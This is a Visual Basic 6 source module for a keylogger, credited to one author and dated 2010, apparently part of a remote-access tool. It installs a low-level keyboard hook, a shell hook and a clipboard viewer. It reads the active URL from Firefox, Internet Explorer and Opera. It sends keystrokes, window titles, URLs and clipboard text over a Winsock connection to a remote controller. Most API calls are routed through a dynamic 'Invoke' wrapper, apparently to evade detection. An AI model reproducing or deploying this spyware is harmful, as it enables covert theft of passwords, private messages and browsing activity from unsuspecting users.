Attribute VB_Name = "modKeyLogger"
Option Explicit
'------------------------------------
'Autor:   Leandro Ascierto
'Web:     www.leandroascierto.com.ar
'Fecha:   13-02-2010
'save input Keys, Active Widows, Url from Navigators and clipboard
'------------------------------------
Private Declare Function PostMessage Lib "user32.dll" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Any) As Long
Private Declare Function RegisterShellHook Lib "Shell32" Alias "#181" (ByVal hwnd As Long, ByVal nAction As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
 
Private Const XCLASS_DATA               As Long = &H2000
Private Const XTYP_REQUEST              As Long = (&HB0 Or XCLASS_DATA)
 
Private Const CP_WINUNICODE             As Long = 1200
Private Const CP_WINANSI                As Long = 1004
Private Const CF_TEXT                   As Long = 1
 
Private Const WM_SETTEXT                As Long = &HC
Private Const WM_GETTEXTLENGTH          As Long = &HE
Private Const WM_GETTEXT                As Long = &HD
 
Private Const RSH_REGISTER_TASKMAN      As Long = 3
Private Const HSHELL_WINDOWACTIVATED    As Long = 4
Private Const WH_KEYBOARD_LL            As Long = 13
Private Const SHELLHOOKMESSAGE          As String = "SHELLHOOK"
Private Const GWL_WNDPROC               As Long = -4
 
Private Const ES_MULTILINE              As Long = &H4&
Private Const ES_AUTOVSCROLL            As Long = &H40&
Private Const ES_AUTOHSCROLL            As Long = &H80&
 
Private Const WM_IME_KEYDOWN            As Long = &H290
Private Const WM_SYSKEYDOWN             As Long = &H104
Private Const WM_KEYDOWN                As Long = &H100
Private Const WM_KEYUP                  As Long = &H101
Private Const WM_DRAWCLIPBOARD          As Long = &H308
Private Const WC_EDIT                   As String = "Edit"

Public hEdit                            As Long

Private WM_SHELLHOOK                    As Long
Private hHook                           As Long
Private OldWinProc                         As Long
Private hFile                           As Integer
Private LastActiveWindow                As Long
Private bTimerEnabled                   As Boolean
Private mLastBrowserInfo                As String
Private mActiveBrowser                  As String
Private m_HostIDSock                    As Long
 
Public Function StarKeyLogger(ByVal HostIDSock As Long) As Boolean

    If hEdit Then Exit Function
    hEdit = Invoke("User32.dll", "CreateWindowExW", 0, StrPtr(WC_EDIT), 0, ES_MULTILINE Or ES_AUTOVSCROLL Or ES_AUTOHSCROLL, 0, 0, 0, 0, 0, 0, App.hInstance, 0)
    'hEdit = CreateWindowEx(0, "EDIT", "", ES_MULTILINE Or ES_AUTOVSCROLL Or ES_AUTOHSCROLL, 0, 0, 0, 0, 0, 0, App.hInstance, 0)

    If hEdit <> 0 Then
        m_HostIDSock = HostIDSock
        hHook = Invoke("User32.dll", "SetWindowsHookExA", WH_KEYBOARD_LL, AddressOf KBProc, App.hInstance, 0) 'hHook = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf KBProc, App.hInstance, 0)
        WM_SHELLHOOK = Invoke("User32.dll", "RegisterWindowMessageW", StrPtr(SHELLHOOKMESSAGE)) 'RegisterWindowMessage(SHELLHOOKMESSAGE)
        RegisterShellHook hEdit, RSH_REGISTER_TASKMAN
        Call Invoke("user32.dll", "SetClipboardViewer", hEdit) 'SetClipboardViewer hEdit
        OldWinProc = Invoke("user32.dll", "SetWindowLongA", hEdit, GWL_WNDPROC, AddressOf WndProc) 'OldWinProc = SetWindowLong(hEdit, GWL_WNDPROC, AddressOf WndProc)
        
        StarKeyLogger = True
    End If
 
End Function
 
Public Function EndKeyLogger() As Boolean
    If hEdit <> 0 Then
        Call Invoke("user32.dll", "UnhookWindowsHookEx", hHook) 'Call UnhookWindowsHookEx(hHook)
        Call Invoke("user32.dll", "SetWindowLongA", hEdit, GWL_WNDPROC, OldWinProc) 'Call SetWindowLong(hEdit, GWL_WNDPROC, OldWinProc)
        If bTimerEnabled Then Call Invoke("user32.dll", "KillTimer", hEdit, 0): bTimerEnabled = False 'KillTimer hEdit, 0: bTimerEnabled = False
        Call Invoke("user32.dll", "DestroyWindow", hEdit): hEdit = 0 'DestroyWindow hEdit: hEdit = 0
        m_HostIDSock = 0
        EndKeyLogger = True
    End If
End Function
 
Private Function WndProc(ByVal hwnd As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    On Error Resume Next

    Dim sRet As String
 
    WndProc = CallWindowProc(OldWinProc, hwnd, uMsg, wParam, lParam)

    Select Case uMsg
        Case WM_SHELLHOOK
            
            If wParam = HSHELL_WINDOWACTIVATED Then
                If lParam <> 0 And LastActiveWindow <> lParam Then
                    LastActiveWindow = lParam
                    
                    If bTimerEnabled Then Call Invoke("user32.dll", "KillTimer", hEdit, 0): bTimerEnabled = False 'KillTimer hEdit, 0: bTimerEnabled = False

                    If GetWindowTextLength(hEdit) > 0 Then SendLog GetWindowText(hwnd)
 
                    Select Case ClassNameOf(lParam)
                        Case "MozillaUIWindowClass"
                            sRet = GetBrowserInfo("firefox")
                            mActiveBrowser = "firefox"
                        Case "IEFrame"
                            sRet = GetBrowserInfo("iexplore")
                            mActiveBrowser = "iexplore"
                        Case "OpWindow"
                            sRet = GetBrowserInfo("opera")
                            mActiveBrowser = "opera"
                    End Select
 
                    If sRet <> "" Then
                        mLastBrowserInfo = sRet
                        bTimerEnabled = True
                        Call Invoke("user32.dll", "SetTimer", hwnd, 0, 3000, AddressOf TimerProc)  'SetTimer hwnd, 0, 5000, AddressOf TimerProc
                    
                        SendLog "[" & Now & "] Ventana Activa: " & GetWindowText(lParam) & vbCrLf & sRet & vbCrLf & String(100, "-") & vbCrLf
                    Else
                        SendLog "[" & Now & "] Ventana Activa: " & GetWindowText(lParam) & vbCrLf & String(100, "-") & vbCrLf
                    End If
 
                End If
 
            End If
 
        Case WM_DRAWCLIPBOARD
        
            If Invoke("user32.dll", "IsClipboardFormatAvailable", vbCFText) <> 0 Then 'If IsClipboardFormatAvailable(vbCFText) <> 0 Then
 
                If GetWindowTextLength(hEdit) > 0 Then SendLog GetWindowText(hwnd)
 
                SendLog "[" & Now & "] Portapaples: " & vbCrLf & String(100, "-") & vbCrLf _
                    & Clipboard.GetText & vbCrLf & String(100, "-") & vbCrLf
            End If
 
    End Select
 
End Function
 
Private Function KBProc(ByVal nCode As Long, ByVal wParam As Long, lParam As Long) As Long
    On Error Resume Next
 
    Select Case wParam
 
        Case WM_KEYDOWN
            If lParam = 13 Then
                If GetWindowTextLength(hEdit) Then SendLog GetWindowText(hEdit) & vbCrLf
            Else
                If lParam <> 222 And lParam <> 186 And lParam <> 162 And lParam <> 20 Then
                    Call PostMessage(hEdit, WM_IME_KEYDOWN, lParam, 0&)
                    If GetWindowTextLength(hEdit) > 20 Then SendLog GetWindowText(hEdit)
                End If
            End If
            
        Case WM_SYSKEYDOWN
            If lParam = 162 Or lParam = 165 Or lParam = 50 Then
                Call PostMessage(hEdit, WM_IME_KEYDOWN, lParam, 0&)
            End If
 
    End Select
 
End Function
 
Private Function GetBrowserInfo(ByVal sServer As String) As String
 
    Dim lpData  As Long, hData   As Long, sData  As String
    Dim hServer As Long, hTopic  As Long, hItem  As Long
    Dim hConv   As Long, idInst  As Long, sRet As String
    
    Const sTopic = "WWW_GetWindowInfo"
    Const sItem = "0xFFFFFFFF"
 
    If Invoke("user32.dll", "DdeInitializeW", VarPtr(idInst), 0&, 0&, 0&) <> 0 Then Exit Function ' DdeInitialize(idInst, 0, 0, 0) <> 0 Then Exit Function
    hServer = Invoke("user32.dll", "DdeCreateStringHandleW", idInst, StrPtr(sServer), CP_WINUNICODE) 'hServer = DdeCreateStringHandle(idInst, sServer, CP_WINANSI)
    hTopic = Invoke("user32.dll", "DdeCreateStringHandleW", idInst, StrPtr(sTopic), CP_WINUNICODE) 'hTopic = DdeCreateStringHandle(idInst, sTopic, CP_WINANSI)
    hItem = Invoke("user32.dll", "DdeCreateStringHandleW", idInst, StrPtr(sItem), CP_WINUNICODE) 'hItem = DdeCreateStringHandle(idInst, sItem, CP_WINANSI)
 
    hConv = Invoke("user32.dll", "DdeConnect", idInst, hServer, hTopic, 0&) 'hConv = DdeConnect(idInst, hServer, hTopic, ByVal 0&)

    If hConv Then
        hData = Invoke("user32.dll", "DdeClientTransaction", 0, 0, hConv, hItem, CF_TEXT, XTYP_REQUEST, 1000, 0) 'hData = DdeClientTransaction(0, 0, hConv, hItem, CF_TEXT, XTYP_REQUEST, 1000, 0)
 
        lpData = Invoke("user32.dll", "DdeAccessData", hData, 0) 'lpData = DdeAccessData(hData, 0)
        
        If lpData Then
            sRet = PtrToString(lpData)
            GetBrowserInfo = Left$(sRet, InStrRev(sRet, ",") - 1)
        End If

        Call Invoke("user32.dll", "DdeUnaccessData", hData) 'DdeUnaccessData hData
        Call Invoke("user32.dll", "DdeFreeDataHandle", hData) 'DdeFreeDataHandle hData
        Call Invoke("user32.dll", "DdeDisconnect", hConv) 'DdeDisconnect hConv
    End If
 
    Call Invoke("user32.dll", "DdeFreeStringHandle", idInst, hServer) 'DdeFreeStringHandle idInst, hServer
    Call Invoke("user32.dll", "DdeFreeStringHandle", idInst, hTopic) 'DdeFreeStringHandle idInst, hTopic
    Call Invoke("user32.dll", "DdeFreeStringHandle", idInst, hItem) 'DdeFreeStringHandle idInst, hItem
    Call Invoke("user32.dll", "DdeUninitialize", idInst) 'DdeUninitialize idInst
 
End Function
 
Private Function GetWindowTextLength(ByVal hwnd As Long) As Long
    GetWindowTextLength = SendMessage(hwnd, WM_GETTEXTLENGTH, 0&, 0&)
End Function
 
Private Function GetWindowText(ByVal hwnd As Long) As String
    Dim TextLen As Long
    TextLen = SendMessage(hwnd, WM_GETTEXTLENGTH, 0&, 0&)
    GetWindowText = String(TextLen, Chr$(0))
    SendMessage hwnd, WM_GETTEXT, TextLen + 1, GetWindowText
End Function
 
Private Function ClassNameOf(ByVal hwnd As Long) As String
    Dim sClassName As String ' * 256
    sClassName = String(256, Chr$(0))
    Dim Ret As Long
    Ret = Invoke("user32.dll", "GetClassNameW", hwnd, StrPtr(sClassName), 256) 'Ret = GetClassName(hwnd, sClassName, 256)
    If Ret Then ClassNameOf = Left$(sClassName, Ret)
End Function
 
Private Function PtrToString(lpwString As Long) As String
    Dim Buffer() As Byte
    Dim nLen As Long
    If lpwString Then
       nLen = Invoke("kernel32.dll", "lstrlenW", lpwString) * 2 'lstrlenW(lpwString) * 2
       If nLen Then
          ReDim Buffer(0 To (nLen - 1)) As Byte
          CopyMemory Buffer(0), ByVal lpwString, nLen
          PtrToString = StrConv(Buffer, vbUnicode)
       End If
    End If
End Function

Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
    Dim sRet As String
    sRet = GetBrowserInfo(mActiveBrowser)
    If sRet <> mLastBrowserInfo Then
        mLastBrowserInfo = sRet
        If GetWindowTextLength(hEdit) > 0 Then SendLog GetWindowText(hwnd) & vbCrLf
        SendLog "[" & Now & "] Ventana Activa: " & GetWindowText(Invoke("user32.dll", "GetForegroundWindow")) & vbCrLf & _
        sRet & vbCrLf & String(100, "-") & vbCrLf
    End If
End Sub

Private Sub SendLog(ByVal sText As String)
    If m_HostIDSock Then
        WinSock32.SendData m_HostIDSock, sText
        SendMessage hEdit, WM_SETTEXT, 0&, vbNullString
    End If
End Sub


